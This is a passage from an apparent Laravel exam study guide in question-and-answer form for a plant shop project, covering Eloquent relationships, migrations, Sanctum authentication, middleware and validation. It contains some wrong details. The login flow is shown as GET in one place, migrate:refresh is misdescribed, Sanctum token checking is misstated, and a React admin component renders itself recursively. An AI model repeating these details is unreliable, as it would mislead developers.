$isWishlisted = $user->wishlist()->where('plant_id', $plantId)->exists();

// Get all wishlist plants
$wishlistPlants = $user->wishlist;
```

**Database:**
```
users table: id, name, email
plants table: id, name, price
wishlists table: id, user_id (FK), plant_id (FK), created_at, updated_at
UNIQUE constraint on (user_id, plant_id) - no duplicates
```

**Explanation:**
- One user can wishlist many plants
- One plant can be wishlisted by many users
- Wishlist table is a pure pivot (connects users and plants)
- UNIQUE constraint prevents same user wishlisting same plant twice

---

**Visual Summary:**

```
User
  ├── hasMany → Orders
  ├── hasMany → Reviews
  ├── hasMany → Wishlist entries
  └── hasMany → Cart items

Order
  ├── belongsTo → User
  └── hasMany → OrderItems
        └── belongsTo → Plant

Plant
  ├── hasMany → Reviews
  ├── hasMany → Wishlist entries
  ├── hasMany → Cart items
  └── hasMany → OrderItems

Review
  ├── belongsTo → User
  └── belongsTo → Plant
```

---

### Q20: What is the difference between: hasMany() / belongsTo() / belongsToMany()?

**Answer:**

**1. hasMany() - One-to-Many (Parent side)**

```php
// User has many Orders
class User extends Model {
    public function orders() {
        return $this->hasMany(Order::class);
        // Looks for 'user_id' column in orders table
    }
}

// Usage
$user = User::find(1);
$orders = $user->orders; // Collection of Order models
```

**Pattern:**
- "One parent has many children"
- Foreign key is in the **child table**
- Returns Collection

**Examples in our project:**
- User hasMany Orders
- Plant hasMany Reviews
- Order hasMany OrderItems

---

**2. belongsTo() - One-to-Many (Child side)**

```php
// Order belongs to User
class Order extends Model {
    public function user() {
        return $this->belongsTo(User::class);
        // Looks for 'user_id' column in THIS table (orders)
    }
}

// Usage
$order = Order::find(1);
$customer = $order->user; // Single User model
```

**Pattern:**
- "Child belongs to parent"
- Foreign key is in **this table**
- Returns single Model (or null)

**Examples in our project:**
- Order belongsTo User
- Review belongsTo Plant
- OrderItem belongsTo Order

---

**3. belongsToMany() - Many-to-Many**

```php
// User can wishlist many Plants
// Plant can be wishlisted by many Users
class User extends Model {
    public function wishlist() {
        return $this->belongsToMany(Plant::class, 'wishlists');
        // Uses pivot table 'wishlists'
    }
}

class Plant extends Model {
    public function wishlistedBy() {
        return $this->belongsToMany(User::class, 'wishlists');
    }
}

// Usage
$user = User::find(1);
$plants = $user->wishlist; // Collection of Plant models

// Add relationship
$user->wishlist()->attach($plantId);

// Remove relationship
$user->wishlist()->detach($plantId);

// Sync (replace all)
$user->wishlist()->sync([1, 2, 3]);
```

**Pattern:**
- "Many to many" relationship
- Requires **pivot table** (junction/intermediate table)
- Both models can access each other through pivot

**Examples in our project:**
- User belongsToMany Plant (through wishlists)

---

**Comparison Table:**

| Relationship | Foreign Key Location | Returns | Example |
|--------------|---------------------|---------|---------|
| hasMany() | Child table | Collection | User → Orders |
| belongsTo() | This table (self) | Model or null | Order → User |
| belongsToMany() | Pivot table | Collection | User ↔ Plants (wishlist) |

**Database Structure Examples:**

```sql
-- hasMany / belongsTo
users: [id, name]
orders: [id, user_id, total]  ← Foreign key here

-- belongsToMany
users: [id, name]
plants: [id, name]
wishlists: [id, user_id, plant_id]  ← Pivot table
```

**Key Difference in Code:**

```php
// hasMany (parent)
User::find(1)->orders;  // Collection of many

// belongsTo (child)
Order::find(1)->user;   // Single model

// belongsToMany (both sides equal)
User::find(1)->wishlist;           // Collection of plants
Plant::find(1)->wishlistedBy;      // Collection of users
```

---

## E) Migrations & Database Design (Deep)

### Q21: What is a Laravel migration? Why not directly modify the database?

**Answer:**

**Migration**: A PHP file that defines database schema changes (create tables, add columns, etc.)

**Without Migrations (Bad):**
```sql
-- Run directly in phpMyAdmin or MySQL
CREATE TABLE plants (id INT PRIMARY KEY AUTO_INCREMENT, name VARCHAR(255));
ALTER TABLE plants ADD COLUMN price DECIMAL(8,2);
-- Problem: Other developers don't know these changes, hard to track, no version control
```

**With Migrations (Good):**
```php
// database/migrations/2026_01_15_000000_create_plants_table.php
class CreatePlantsTable extends Migration {
    public function up() {
        Schema::create('plants', function (Blueprint $table) {
            $table->id();
            $table->string('name');
            $table->decimal('price', 8, 2);
            $table->timestamps();
        });
    }
    
    public function down() {
        Schema::dropIfExists('plants');
    }
}
```

**Benefits:**

1. **Version Control**: Tracked in Git, can see who changed what
2. **Consistency**: All environments (dev, staging, prod) have same schema
3. **Reversible**: Can `rollback` to previous state
4. **Automated**: `php artisan migrate` runs all pending migrations
5. **Collaboration**: Multiple developers can create migrations, no conflicts
6. **Team Onboarding**: New dev just runs `migrate` to get full schema

**Migration Flow:**

```
php artisan migrate          ← Create all pending migrations
php artisan migrate:rollback ← Undo last migration
php artisan migrate:refresh  ← Drop all, then create fresh
php artisan migrate:reset    ← Undo all migrations
```

**In our project:**
```bash
php artisan migrate  # Creates: users, plants, orders, carts, reviews, wishlists, etc
```

**How to create new migration:**
```bash
php artisan make:migration add_description_to_plants_table
# Creates: database/migrations/2026_02_26_000000_add_description_to_plants_table.php
```

---

### Q22: What is the difference between up() and down() in migrations?

**Answer:**

**up()** - What to do when migration runs:
```php
public function up() {
    Schema::create('plants', function (Blueprint $table) {
        $table->id();
        $table->string('name');
        $table->timestamps();
    });
    // Creates 'plants' table
}
```

**down()** - How to undo the migration:
```php
public function down() {
    Schema::dropIfExists('plants');
    // Deletes 'plants' table
}
```

**Why both?**

1. **Reversibility**: Can rollback if migration has bug
2. **Development**: Reset database easily
3. **Testing**: Different migrations for different scenarios

**Example with AddColumn:**
```php
public function up() {
    Schema::table('plants', function (Blueprint $table) {
        $table->string('description')->nullable();
    });
}

public function down() {
    Schema::table('plants', function (Blueprint $table) {
        $table->dropColumn('description');
    });
}
```

**Real scenario:**
```bash
# Migration has bug
php artisan migrate     # Runs up() - fails!
php artisan migrate:rollback  # Runs down() - reverts changes
# Fix the migration file
php artisan migrate     # Runs again - works!
```

---

### Q23: What columns do all models automatically have in our project? (timestamps, soft deletes, etc.)

**Answer:**

**Automatic Timestamps (in every migration):**
```php
public function up() {
    Schema::create('plants', function (Blueprint $table) {
        $table->id();
        $table->string('name');
        $table->timestamps();  // Creates created_at and updated_at
    });
}
```

**What timestamps() creates:**
- `created_at` - When record was first created
- `updated_at` - When record was last modified

**Usage in Model:**
```php
class Plant extends Model {
    // Automatically casts to Carbon (date/time library)
    protected $casts = [
        'created_at' => 'datetime',
        'updated_at' => 'datetime',
    ];
}

// Usage
$plant = Plant::find(1);
echo $plant->created_at->format('Y-m-d');  // "2026-02-15"
echo $plant->created_at->diffForHumans();  // "11 days ago"
```

**In our project - All tables have:**
```
id (Primary Key)
created_at
updated_at
```

**Optional: Soft Deletes (Not used in our project, but good to know):**
```php
// In migration
Schema::create('plants', function (Blueprint $table) {
    $table->id();
    $table->string('name');
    $table->softDeletes();  // Adds deleted_at column
    $table->timestamps();
});

// In Model
class Plant extends Model {
    use SoftDeletes;
}

// Usage
$plant->delete();  // Sets deleted_at to current time (soft delete)
Plant::all();  // Returns only non-deleted plants
Plant::withTrashed()->all();  // Includes soft-deleted
Plant::onlyTrashed()->all();  // Only soft-deleted
$plant->forceDelete();  // Permanently delete
$plant->restore();  // Undelete
```

**Note:** Our project deletes hard (permanently), not soft deletes.

---

### Q24: How does foreign key work in database? (user_id in orders table)

**Answer:**

**Foreign Key**: A column that references the primary key of another table.

**In our project - Order to User:**
```php
// 2024_01_15_create_orders_table.php
Schema::create('orders', function (Blueprint $table) {
    $table->id();
    $table->unsignedBigInteger('user_id');  // Foreign key
    $table->decimal('total', 10, 2);
    $table->timestamps();
    
    // Define foreign key constraint
    $table->foreign('user_id')
          ->references('id')
          ->on('users')
          ->onDelete('cascade');  // If user deleted, delete orders too
});
```

**What this does:**

1. **Constraint**: Can only insert `user_id` value if it exists in users table
2. **Referential Integrity**: Database prevents orphaned records
3. **Cascade Delete**: If user deleted, all their orders deleted too

**Without cascade delete:**
```php
$table->foreign('user_id')->references('id')->on('users');
// If you try delete user who has orders → Error!
```

**With cascade delete:**
```php
$table->foreign('user_id')->references('id')->on('users')->onDelete('cascade');
// Delete user → All their orders automatically deleted
```

**Database level:**
```sql
-- Shows all constraints
SHOW CREATE TABLE orders;

-- Output shows:
CONSTRAINT `orders_user_id_foreign` 
FOREIGN KEY (`user_id`) 
REFERENCES `users` (`id`) 
ON DELETE CASCADE
```

**In our project (all relationships have cascade delete):**
- Order → User (cascade)
- Cart → User (cascade)
- Review → User & Plant (cascade)
- OrderItem → Order & Plant (cascade)

---

### Q25: What is database normalization? Why is it important?

**Answer:**

**Normalization**: Organizing database to minimize data duplication and ensure data integrity.

**Bad Design (Not Normalized):**
```
orders table:
| id | user_name | user_email | user_phone | product_name | product_price |
| 1  | John      | john@...   | 123456     | Monstera     | 1500          |
| 2  | John      | john@...   | 123456     | Pothos       | 1200          |
| 3  | Jane      | jane@...   | 789012     | Monstera     | 1500          |
```

**Problems:**
- Data repetition (John's info appears twice)
- Update anomaly (Change John's email - must update 2 rows!)
- Delete anomaly (If John's only order deleted, lose his info)
- Wasted storage

**Good Design (Normalized - Our project):**
```
users table:
| id | name | email      | phone  |
| 1  | John | john@...   | 123456 |
| 2  | Jane | jane@...   | 789012 |

products table:
| id | name     | price |
| 1  | Monstera | 1500  |
| 2  | Pothos   | 1200  |

orders table:
| id | user_id | product_id |
| 1  | 1       | 1          |
| 2  | 1       | 2          |
| 3  | 2       | 1          |
```

**Benefits:**
- No duplication
- Easy updates (change John's email once)
- Data consistency
- Less storage

**Normalization Levels:**

| Level | Rule | Example |
|-------|------|---------|
| 1NF | No repeating groups | Each column has single value |
| 2NF | Remove partial dependencies | Non-key columns depend on entire key |
| 3NF | Remove transitive dependencies | Non-key columns depend only on primary key |

**Our project is 3NF normalized** with proper:
- Separate tables for entities
- Foreign keys for relationships
- No data duplication

---

## F) Authentication & Sanctum (Most Important for Viva)

### Q26: How does Sanctum authentication work in your project? Full flow from frontend to backend.

**Answer:**

**Step 1: User Logs In**
```
Frontend                          Backend
GET /api/login ────────→          AuthController::login()
  {email, password}                 ↓
                                   Find user in database
                                   ↓
                                   Hash.compare(password)
                                   ↓
                                   Create API token
                                   ↓
                        ←──────────return {token, user}
localStorage.token = token
```

**Backend Code (AuthController::login):**
```php
public function login(Request $request) {
    $credentials = $request->validate([
        'email' => 'required|email',
        'password' => 'required',
    ]);
    
    // Find user by email
    $user = User::where('email', $credentials['email'])->first();
    
    // Check password (Laravel hashes and compares)
    if (!$user || !Hash::check($credentials['password'], $user->password)) {
        return response()->json(['error' => 'Invalid credentials'], 401);
    }
    
    // Create token (stored in personal_access_tokens table)
    $token = $user->createToken('auth_token')->plainTextToken;
    
    return response()->json([
        'token' => $token,
        'user' => $user,
    ]);
}
```

**Step 2: Frontend Stores Token**
```js
// login.ts or similar
const response = await fetch('http://127.0.0.1:8000/api/login', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({email, password})
});

const {token, user} = await response.json();
localStorage.setItem('token', token);
localStorage.setItem('user', JSON.stringify(user));
```

**Step 3: Frontend Makes Protected Request with Token**
```js
// In API calls
fetch('http://127.0.0.1:8000/api/cart', {
    headers: {
        'Authorization': `Bearer ${localStorage.getItem('token')}`,
        'Content-Type': 'application/json',
    }
});
```

**Step 4: Backend Verifies Token**
```php
// routes/api.php
Route::middleware('auth:sanctum')->group(function () {
    Route::get('/cart', [CartController::class, 'index']);
});

// What auth:sanctum middleware does:
// 1. Extract token from Authorization header
// 2. Look up token in personal_access_tokens table
// 3. If found and valid:
//    - $user = User found
//    - auth()->user() returns that user
// 4. If not found or expired:
//    - Return 401 Unauthorized

// In controller
public function index() {
    $user = auth()->user();  // User is authenticated via token
    $cart = Cart::where('user_id', $user->id)->with('plant')->get();
    return response()->json(['data' => $cart]);
}
```

**Step 5: Frontend Handles Response**
```js
const response = await fetch('http://127.0.0.1:8000/api/cart', {
    headers: {'Authorization': `Bearer ${token}`}
});

if (response.status === 401) {
    // Token invalid/expired - logout user
    localStorage.removeItem('token');
    redirect('/login');
}

const {data} = await response.json();
// Use data (cart items)
```

**Database Structure:**
```sql
-- users table
id | email | password (hashed) | name

-- personal_access_tokens table
id | tokenable_id | name | token (hashed) | abilities | last_used_at | expires_at | created_at | updated_at

-- When user logs in, new row added to personal_access_tokens
```

**Token Format:**
```
Token returned to frontend: "5|abcdef123456...xyz" (1 long string)
  ↓
Token stored in DB: [hashed version]
  ↓
Frontend sends: Bearer 5|abcdef123456...xyz
  ↓
Backend: Hash.check(token_sent, token_in_db) → Matches!
```

---

### Q27: What is the difference between login and authenticate? What does it mean to "authenticate"?

**Answer:**

**Authenticate** means "verify that the user is who they claim to be"

**Login Process:**
1. User provides credentials (email + password)
2. System verifies credentials are correct
3. System creates token
4. System returns token to user

**Authenticate Request Process:**
1. User sends request with token
2. System verifies token is valid
3. System verifies token hasn't expired
4. System loads user associated with token
5. Request proceeds with that user context

**In Code:**

**Login (Create Token):**
```php
// AuthController::login
public function login(Request $request) {
    // Step 1: Verify email/password are correct
    $user = User::where('email', $request->email)->first();
    if (!Hash::check($request->password, $user->password)) {
        return response()->json(['error' => 'Invalid'], 401);
    }
    
    // Step 2: Create token
    $token = $user->createToken('auth_token')->plainTextToken;
    
    // Step 3: Return token
    return response()->json(['token' => $token]);
}
```

**Authenticate (Verify Token):**
```php
// routes/api.php
Route::middleware('auth:sanctum')->group(function () {
    // auth:sanctum middleware authenticates the request
    Route::get('/profile', [UserController::class, 'profile']);
});

// UserController::profile
public function profile() {
    // At this point, request is already authenticated
    // Middleware verified the token
    $user = auth()->user(); // This is guaranteed to work
    return response()->json(['user' => $user]);
}
```

**Difference Summary:**

| Step | Login | Authenticate |
|------|-------|--------------|
| **Initiator** | User (provides email/password) | User (provides token) |
| **What verified** | Email/password match | Token is valid & not expired |
| **Result** | Token created | User loaded from token |
| **Where** | AuthController | Middleware |
| **Status Code on Success** | 200 (token returned) | 200 (request proceeds) |
| **Status Code on Fail** | 401 Unauthorized | 401 Unauthorized |

**Complete Flow:**
```
1. User visits login page
2. User submits email/password
3. POST /api/login → AuthController::login → Verify credentials
4. Token created and returned
5. Frontend stores token
6. User clicks "View Cart"
7. Frontend sends GET /api/cart with token
8. Middleware authenticates request (verifies token)
9. CartController loaded with $user context
10. Response returned
```

---

### Q28: How does your code check if a user is logged in or admin?

**Answer:**

**Is User Logged In?**

```php
// Frontend: Check if token exists
if (localStorage.getItem('token')) {
    // User is logged in
}

// Backend: Inside protected route
Route::middleware('auth:sanctum')->group(function () {
    // If we reach here, user is authenticated
    $user = auth()->user();  // Not null
});

// OR check explicitly
if (auth()->check()) {
    // User is logged in
}

// Get logged-in user data
$user = auth()->user();  // Returns User model or null
```

**Is User Admin?**

```php
// Option 1: Check role field directly
if ($user->role === 'admin') {
    // User is admin
}

// Option 2: Use method
if ($user->isAdmin()) {  // If defined in User model
    // User is admin
}

// Option 3: Middleware (Better)
Route::middleware('auth:sanctum', 'admin')->group(function () {
    // Only admins can access these routes
    Route::post('/plants', [...]);  
});
```

**How AdminMiddleware works:**

```php
// app/Http/Middleware/AdminMiddleware.php
class AdminMiddleware {
    public function handle($request, $next) {
        // Check if user is logged in
        if (!auth()->check()) {
            return response()->json(['error' => 'Unauthorized'], 401);
        }
        
        // Check if user is admin
        if (auth()->user()->role !== 'admin') {
            return response()->json(['error' => 'Forbidden'], 403);
        }
        
        // User is logged in AND admin
        return $next($request);
    }
}

// Register in bootstrap/app.php
$middleware->alias('admin', AdminMiddleware::class);

// Use in routes
Route::middleware(['auth:sanctum', 'admin'])->group(function () {
    Route::post('/plants', [PlantController::class, 'store']);
});
```

**Complete Authentication Check in Frontend:**

```js
// pages/AdminDashboard.tsx
import {useEffect, useState} from 'react';

export default function AdminDashboard() {
    const [isAdmin, setIsAdmin] = useState(false);
    const [loading, setLoading] = useState(true);
    
    useEffect(() => {
        const checkAdmin = async () => {
            const token = localStorage.getItem('token');
            
            // Check 1: Token exists?
            if (!token) {
                setIsAdmin(false);
                setLoading(false);
                redirect('/login');
                return;
            }
            
            // Check 2: Fetch user profile to verify
            const response = await fetch('/api/profile', {
                headers: {
                    'Authorization': `Bearer ${token}`
                }
            });
            
            if (response.status === 401) {
                // Token invalid
                localStorage.removeItem('token');
                setIsAdmin(false);
                redirect('/login');
                return;
            }
            
            const {user} = await response.json();
            
            // Check 3: Is user admin?
            if (user.role === 'admin') {
                setIsAdmin(true);
            } else {
                redirect('/');
            }
            
            setLoading(false);
        };
        
        checkAdmin();
    }, []);
    
    if (loading) return <p>Loading...</p>;
    if (!isAdmin) return <p>Access Denied</p>;
    
    return <AdminDashboard />;
}
```

---

### Q29: What is the difference between auth()->check() and auth()->user()?

**Answer:**

**auth()->check()** - Returns boolean (true/false)
```php
if (auth()->check()) {
    // User is logged in
} else {
    // User is NOT logged in (guest)
}
```

**auth()->user()** - Returns User model or null
```php
$user = auth()->user();

if ($user) {
    // User is logged in
    echo $user->name;  // Can use user data
} else {
    // User is not logged in
    $user is null
}
```

**Difference:**

| Method | Returns | Check | Use Case |
|--------|---------|-------|----------|
| auth()->check() | boolean (true/false) | If statement | "Is anyone logged in?" |
| auth()->user() | User model or null | Direct access | "Get logged-in user data" |

**Examples:**

```php
// Check if logged in
if (auth()->check()) {
    echo "Welcome " . auth()->user()->name;
}

// Simpler way
if ($user = auth()->user()) {
    echo "Welcome " . $user->name;
}

// Even simpler (use directly if you know they're logged in)
Route::middleware('auth:sanctum')->group(function () {
    $user = auth()->user();  // Guaranteed not null
});

// Check both
$user = auth()->user(); // Could be null

if ($user === null) {
    // Not logged in
} else {
    // Logged in, use $user
    echo $user->email;
}
```

**In Frontend (JavaScript):**

```js
// Check if token exists (user logged in)
const token = localStorage.getItem('token');

if (token) {
    // User is logged in
    const user = JSON.parse(localStorage.getItem('user'));
    console.log(user.email);
} else {
    // User is not logged in
    redirect('/login');
}
```

---

### Q30: What happens if user's token expires? How do you handle it?

**Answer:**

**Current Setup (Our Project):**

Tokens don't expire by default because we didn't set `expires_at`:

```php
// In login
$token = $user->createToken('auth_token')->plainTextToken;
// No expiration set → Token works forever!
```

**Problem**: If token leaked, it works forever!

**Proper Setup (Production):**

```php
// Set token expiration
$token = $user->createToken('auth_token', ['*'], 
    now()->addHours(24)  // Expires in 24 hours
)->plainTextToken;

// Returns response
return response()->json([
    'token' => $token,
    'expires_in' => 86400, // seconds
]);
```

**How Expiration Works:**

```sql
-- personal_access_tokens table
| id | tokenable_id | token | expires_at | created_at |
| 1  | 123          | xxxxx | 2026-02-27 10:00 | 2026-02-26 10:00 |
-- Expires in 24 hours
```

**When User Makes Request with Expired Token:**

```php
// Middleware checks
in personal_access_tokens table:
  SELECT * FROM personal_access_tokens WHERE token = '{user_token}'
  
  ↓
  If expires_at < NOW():
    Token has expired!
    Return 401 Unauthorized
    
  ↓
  If expires_at > NOW():
    Token is still valid
    Proceed with request
```

**Frontend Handling (Expired Token):**

```js
// api.ts or fetch wrapper
async function apiCall(url, options = {}) {
    const token = localStorage.getItem('token');
    
    const response = await fetch(url, {
        ...options,
        headers: {
            'Authorization': `Bearer ${token}`,
            ...options.headers,
        }
    });
    
    // Check if token expired
    if (response.status === 401) {
        // Token expired or invalid
        localStorage.removeItem('token');
        localStorage.removeItem('user');
        
        // Redirect to login
        window.location.href = '/login';
        return null;
    }
    
    return response.json();
}

// Usage in component
const cart = await apiCall('/api/cart');
// If token expired → Automatically redirects to login
```

**Refresh Token Pattern (Advanced - not in our project):**

```php
// Return both access token (short-lived) and refresh token (long-lived)
$accessToken = $user->createToken('access', ['*'], 
    now()->addHours(1)  // Expires in 1 hour
)->plainTextToken;

$refreshToken = $user->createToken('refresh', ['*'], 
    now()->addMonths(1)  // Expires in 1 month
)->plainTextToken;

return response()->json([
    'access_token' => $accessToken,
    'refresh_token' => $refreshToken,
]);

// When access token expires, use refresh token to get new access token
Route::post('/refresh', function (Request $request) {
    // Verify refresh token
    // Create new access token
    // Return new access token
});
```

**Best Practice for Nepal Cozy Care:**

```php
// Make tokens expire after 7 days
$expiresAt = now()->addDays(7);

$token = $user->createToken(
    'auth_token',
    ['*'],
    $expiresAt
)->plainTextToken;

return response()->json([
    'token' => $token,
    'user' => $user,
    'expires_at' => $expiresAt,
]);
```

---

## G) Middleware & Authorization

### Q31: What is middleware? Explain with examples from your project.

**Answer:**

**Middleware** is code that runs BEFORE your controller to check conditions.

**Without Middleware (Bad):**
```php
public function store(Request $request) {
    // Check if user is logged in
    if (!auth()->check()) {
        return response()->json(['error' => 'Unauthorized'], 401);
    }
    
    // Check if user is admin
    if (auth()->user()->role !== 'admin') {
        return response()->json(['error' => 'Forbidden'], 403);
    }
    
    // Check if request is valid JSON
    $validated = $request->validate([...]);
    
    // ... actual business logic
}

// Same checks repeated in every protected method!
```

**With Middleware (Good):**
```php
// Middleware handles all checks
Route::middleware(['auth:sanctum', 'admin'])->group(function () {
    Route::post('/plants', [PlantController::class, 'store']);
    // Controller only has business logic
});

public function store(Request $request) {
    // Middleware already verified:
    // - User is logged in
    // - User is admin
    // Just do business logic
    Plant::create($request->validated());
}
```

**Middleware Flow:**
```
Request → Middleware 1 → Middleware 2 → Controller → Response
           ↓checks      ↓checks                       ↓format
           auth         admin                        JSON
```

**Middleware in Our Project:**

**1. auth:sanctum - Verify token**
```php
Route::middleware('auth:sanctum')->group(function () {
    // Only logged-in users
    Route::get('/cart', [CartController::class, 'index']);
});
```

**2. admin - Verify user is admin (custom in our project)**
```php
Route::middleware(['auth:sanctum', 'admin'])->group(function () {
    // Only logged-in admins
    Route::post('/plants', [PlantController::class, 'store']);
});
```

**3. cors - Allow React to access API**
```php
// Automatically applied
// Adds CORS headers to response
```

**Creating Custom Middleware:**
```php
// app/Http/Middleware/AdminMiddleware.php
class AdminMiddleware {
    public function handle($request, $next) {
        // Check if user is admin
        if (auth()->user()->role !== 'admin') {
            return response()->json([
                'error' => 'Only admins can access this'
            ], 403);
        }
        
        // Continue to next middleware or controller
        return $next($request);
    }
}

// Register in bootstrap/app.php
$middleware->alias('admin', AdminMiddleware::class);

// Use in routes
Route::middleware('admin')->group(function () {
    // ...
});
```

---

### Q32: Why do we need middleware? What problems does it solve?

**Answer:**

**Problems without Middleware:**

1. **Repeated Code**: Same authorization checks in every controller
2. **Error Prone**: Easy to forget check in some controller
3. **Hard to Change**: Change auth logic → update multiple controllers
4. **Mixed Concerns**: Business logic mixed with auth checks
5. **Hard to Test**: Can't test auth separately from business logic

**Solutions Middleware Provides:**

1. **Centralized Control**: Define once, apply everywhere
2. **Consistency**: All routes behave same way
3. **Easy to Change**: Modify middleware in one place
4. **Separation of Concerns**: Auth separate from business logic
5. **Reusability**: Middleware can be used in many routes
6. **Testing**: Test middleware separately
7. **Chain Multiple**: Stack multiple middleware for complex auth

**Real Scenarios:**

**Scenario 1: Add new admin feature**
```
Without middleware:
- Create controller method
- Add auth check in method
- Add admin check in method
- Test method
- If needed to add logging:
  - Add logging to this method
  - Go back to other admin methods
  - Add logging to each
  
With middleware:
- Create controller method (just business logic!)
- Add route with middleware: ['auth:sanctum', 'admin']
- Done! Logging, auth, admin check all handled by middleware
```

**Scenario 2: API rate limiting**
```
Without middleware:
- Add rate limiting check in every controller method
- Repeat code everywhere

With middleware:
- Create RateLimitMiddleware once
- Apply to all public routes
- If user makes > 100 requests/hour → 429 Too Many Requests
```

**Scenario 3: Log all admin actions**
```
Without middleware:
- Add logging to every admin controller method

With middleware:
- Create LoggingMiddleware
- Apply to admin routes
- All admin actions logged automatically
```

---

### Q33: What is the difference between global middleware and route middleware?

**Answer:**

**Global Middleware** - Runs on EVERY request
```php
// bootstrap/app.php
$middleware->use([
    \Illuminate\Foundation\Http\Middleware\ValidatePostSize::class,
    \App\Http\Middleware\TrustProxies::class,
    \Illuminate\Http\Middleware\HandleCors::class,
    // These run on EVERY request - login, plants, cart, everything
]);
```

**Route Middleware** - Only runs on specific routes
```php
// bootstrap/app.php
$middleware->alias('auth', \App\Http\Middleware\Authenticate::class);

// routes/api.php
Route::middleware('auth:sanctum')->group(function () {
    // auth:sanctum only runs on these routes
    Route::get('/cart', [...]);
});

// This route doesn't use auth
Route::get('/plants', [...]);  // auth doesn't run here
```

**Comparison:**

| Aspect | Global | Route |
|--------|--------|-------|
| **Runs On** | Every request | Specific routes only |
| **When to Use** | CORS, logging, errors | Auth, permission checks |
| **Performance** | Runs always | Skipped if not needed |
| **Setup** | bootstrap/app.php | routes/api.php |
| **Examples** | CORS, TrustProxies | auth, admin, throttle |

**Flow Example:**

```
Request for GET /api/plants (public)
↓
Global Middleware
  - CORS check ✓
  - Validate request ✓
↓
Route middleware (not applied)
  - auth (skipped)
  - admin (skipped)
↓
Controller methods

---

Request for POST /api/plants (admin only)
↓
Global Middleware
  - CORS check ✓
  - Validate request ✓
↓
Route Middleware
  - auth:sanctum checks token ✓
  - admin checks role ✓
↓
Controller method
```

---

### Q34: In your project, what does the 'admin' middleware do exactly?

**Answer:**

Let me check your project's AdminMiddleware:
```php
// app/Http/Middleware/AdminMiddleware.php
class AdminMiddleware extends Middleware {
    public function handle(Request $request, Closure $next) {
        // Check if user is authenticated
        if (!auth()->check()) {
            return response()->json(
                ['error' => 'Unauthorized - must login first'],
                401
            );
        }
        
        // Check if user is admin
        if (auth()->user()->role !== 'admin') {
            return response()->json(
                ['error' => 'Forbidden - admin access required'],
                403
            );
        }
        
        // User is logged in AND admin
        return $next($request);
    }
}
```

**What it does step-by-step:**

1. **Check 1**: Is user logged in?
   - Looks for valid Sanctum token
   - If no: Returns 401 Unauthorized

2. **Check 2**: Is user's role = 'admin'?
   - Checks User.role field in database
   - If role is 'user': Returns 403 Forbidden
   - If role is 'admin': Proceeds ✓

**Where it's used:**
```php
// routes/api.php
Route::middleware(['auth:sanctum', 'admin'])->group(function () {
    Route::post('/plants', [PlantController::class, 'store']);
    Route::put('/plants/{id}', [PlantController::class, 'update']);
    Route::delete('/plants/{id}', [PlantController::class, 'destroy']);
    // Similar for blogs, care-tips
});
```

**Example Flow:**

**✅ Successful (Admin):**
```
User makes: POST /api/plants with admin token
↓
Middleware: auth:sanctum checks token ✓
↓
Middleware: admin checks role = 'admin' ✓
↓
PlantController::store() runs
↓
Response: Plant created with 201
```

**❌ Failed (Regular User):**
```
User makes: POST /api/plants with regular user token
↓
Middleware: auth:sanctum checks token ✓
↓
Middleware: admin checks role = user ✗
↓
Returns: {"error": "Forbidden - admin access required"} 403
↓
PlantController::store() NEVER RUNS
```

**❌ Failed (No Token):**
```
User makes: POST /api/plants (no token)
↓
Middleware: auth:sanctum checks token ✗
↓
Returns: {"error": "Unauthenticated"} 401
↓
Admin check never happens
```

---

### Q35: What's the difference between 401 and 403 status codes?

**Answer:**

**401 Unauthorized** - "Who are you?"
- User is **not authenticated** (invalid/missing token)
- User needs to login first

**403 Forbidden** - "You don't have permission"
- User **is authenticated** but doesn't have permission
- User is logged in but their role is insufficient

**In our project:**

**401 - When to return:**
```php
// Missing token
GET /api/cart
// Error: No Authorization header → 401

// Invalid token
GET /api/cart
Header: Authorization: Bearer invalid_token
// Error: Token doesn't exist in DB → 401

// Expired token
GET /api/cart
Header: Authorization: Bearer expired_token
// Error: expires_at < now() → 401
```

**403 - When to return:**
```php
// Valid token, but not admin
POST /api/plants
Header: Authorization: Bearer valid_user_token
// User is logged in (authenticated) ✓
// But role is 'user', not 'admin' ✗
// Error: 403 Forbidden

// User trying to delete another user's order
DELETE /api/orders/5
Header: Authorization: Bearer user1_token
// User is logged in ✓
// But order belongs to user2 ✗
// Error: 403 Forbidden
```

**HTTP Status Codes:**

| Code | Name | Meaning | Action |
|------|------|---------|--------|
| 200 | OK | Success | Continue |
| 201 | Created | Resource created | ✓ |
| 400 | Bad Request | Invalid data | Fix input |
| 401 | Unauthorized | Not authenticated | Login |
| 403 | Forbidden | Not authorized | Contact admin |
| 404 | Not Found | Resource doesn't exist | Check URL/ID |
| 422 | Unprocessable Entity | Validation failed | Fix form |
| 500 | Server Error | Backend error | Contact support |

**Decision Tree:**

```
User accessing protected resource?
├─ No token or invalid token?
│  └─ Return 401 (login)
├─ Valid token but insufficient permission?
│  └─ Return 403 (forbidden)
├─ Resource doesn't exist?
│  └─ Return 404
└─ Valid, permitted, exists?
   └─ Return 200/201
```

---

## H) Validation & Error Handling  

### Q36: What are the different ways to validate in Laravel? Which is best?

**Answer:**

**Method 1: Direct validate() in Controller (Simple)**
```php
public function store(Request $request) {
    $validated = $request->validate([
        'name' => 'required|string|max:255',
        'price' => 'required|numeric|min:0',
        'stock' => 'required|integer',
    ]);
    // If validation fails, returns 422 with errors
    // If passes, continues
    
    Plant::create($validated);
}
```

**Method 2: FormRequest Class (Professional)**
```php
// app/Http/Requests/StorePlantRequest.php
class StorePlantRequest extends FormRequest {
    public function authorize() {
        return auth()->user()->role === 'admin';
    }
    
    public function rules() {
        return [
            'name' => 'required|string|max:255',
            'price' => 'required|numeric|min:0',
            'stock' => 'required|integer',
        ];
    }
    
    public function messages() {
        return [
            'name.required' => 'Plant name is required',
            'price.numeric' => 'Price must be a number',
        ];
    }
}

// Controller
public function store(StorePlantRequest $request) {
    Plant::create($request->validated());
}
```

**Method 3: Manual Validation with Try-Catch**
```php
public function store(Request $request) {
    try {
        $validated = $request->validate([...]);
        Plant::create($validated);
        return response()->json(['created' => true]);
    } catch (\Illuminate\Validation\ValidationException $e) {
        return response()->json([
            'errors' => $e->errors()
        ], 422);
    }
}
```

**Method 4: Custom Validation Rules**
```php
// Create custom rule
php artisan make:rule ValidPlantPrice

// app/Rules/ValidPlantPrice.php
class ValidPlantPrice {
    public function validate($attribute, $value, $fail) {
        if ($value > 100000) {
            $fail('Price too high');
        }
    }
}

// Use it
$request->validate([
    'price' => ['required', new ValidPlantPrice()],
]);
```

**Comparison:**

|  | Direct validate() | FormRequest | Manual | Custom Rule |
|---|---|---|---|---|
